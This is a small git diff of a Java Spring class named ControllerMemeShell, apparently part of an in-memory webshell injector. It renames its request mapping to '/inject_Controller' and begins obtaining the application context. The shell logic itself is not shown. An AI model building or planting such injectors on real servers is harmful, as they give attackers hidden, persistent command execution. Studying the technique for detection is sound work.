@@ -15,11 +15,12 @@ import javax.servlet.http.HttpServletRequest;
 import java.io.IOException;
 import java.lang.reflect.Method;
 
+
 @Controller
 public class ControllerMemeShell {
 
     // @ResponseBody
-    @RequestMapping("/control")
+    @RequestMapping("/inject_Controller")
     public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException{
         // 获取当前上下文环境
         WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
